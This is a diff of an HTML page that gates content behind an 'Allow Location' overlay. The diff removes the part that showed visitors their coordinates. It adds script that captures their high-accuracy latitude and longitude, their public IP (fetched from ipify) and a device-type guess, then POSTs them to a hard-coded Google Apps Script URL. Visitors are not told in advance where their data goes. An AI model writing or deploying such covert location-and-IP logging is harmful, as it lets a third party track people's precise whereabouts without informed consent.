@@ -18,20 +18,6 @@
             flex-direction: column;
             z-index: 9999;
         }
-        #mainContent {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 9999;
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -40,32 +26,58 @@
         <button onclick="requestLocation()">Allow Location</button>
         <p id="status" style="color: red;"></p>
     </div>
-    <div id="mainContent">
-        <h1>Your location coordinates are</h1>
-        <p id="cords"></p>
-    </div>
     <script>
-        function requestLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        document.getElementById("blocker").style.display = "none";
-                        document.getElementById("mainContent").style.display = "flex";
-                        document.getElementById("cords").innerText = position.coords.latitude + " , " + position.coords.longitude;
-                    },
-                    (error) => {
-                        document.getElementById("status").innerText = "Error retrieving position: " + error.code +" , "+ error.message;
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
+    function requestLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    //1. Declare 'device' outside the if block
+                    let device = (window.innerWidth <= 768) ? "Mobile" : "Not_Mobile";
+
+                    //2. Get IP using fetch and await
+                    let ip = "Unknown";
+                    try {
+                        const res = await fetch('https://api.ipify.org?format=json');
+                        const data = await res.json();
+                        ip = data.ip;
+                    } catch (err) {
+                        ip = "Error: " + err;
                     }
-                );
-            } else {
-                document.getElementById("status").innerText = "Geolocation is not supported";
-            }
+
+                    //3. Get location
+                    const location = `${position.coords.latitude},${position.coords.longitude}`;
+
+                    //4. Prepare and send
+                    const scriptURL = "https://script.google.com/macros/s/AKfycbxViqRDUzkPkMPMWbkiCuJXI5EjD7nP9-csoOWvqbFOOMFHyWJ1Enqv7_fmB51NWpE2/exec";
+                    const formData = new FormData();
+                    formData.append("device", device);
+                    formData.append("ip", ip);
+                    formData.append("location", location);
+
+                    try {
+                        const response = await fetch(scriptURL, {
+                            method: "POST",
+                            body: formData
+                        });
+                        const text = await response.text();
+                        document.getElementById("status").innerText = "✅ Data submitted!";
+                    } catch (error) {
+                        document.getElementById("status").innerText = "❌ Data not submitted. Error: " + error;
+                    }
+                },
+                (error) => {
+                    document.getElementById("status").innerText = "Error retrieving position: " + error.code + " - " + error.message;
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        } else {
+            document.getElementById("status").innerText = "❌ Geolocation is not supported";
         }
-    </script>
+    }
+</script>
 </body>
 </html>
